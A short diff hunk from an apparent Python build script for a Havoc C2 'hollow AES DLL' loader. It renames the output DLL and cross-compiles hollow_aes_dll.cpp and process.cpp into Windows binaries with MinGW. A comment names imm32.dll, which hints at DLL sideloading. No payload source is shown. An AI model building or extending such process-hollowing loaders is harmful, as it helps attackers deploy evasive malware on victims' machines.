@@ -273,7 +273,7 @@ def HAVOCeightAES_hollow_dll():
         exit(1)
         
     try:
-        subprocess.run(["x86_64-w64-mingw32-g++","-shared", "-o", "dhanushgowda.dll", "hollow_aes_dll.cpp","-lws2_32","-lwinhttp","-lcrypt32","-static-libgcc","-static-libstdc++", "-fpermissive"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        subprocess.run(["x86_64-w64-mingw32-g++","-shared", "-o", "mahira1.dll", "hollow_aes_dll.cpp","-lws2_32","-lwinhttp","-lcrypt32","-static-libgcc","-static-libstdc++", "-fpermissive"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         
         #x86_64-w64-mingw32-g++ -shared -o imm32.dll dll.cpp -lws2_32 -lwinhttp -lcrypt32 -static-libgcc -static-libstdc++ -fpermissive
         subprocess.run(["x86_64-w64-mingw32-g++", "--static", "-o", "Mahira_dll.exe", "process.cpp", "-fpermissive"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
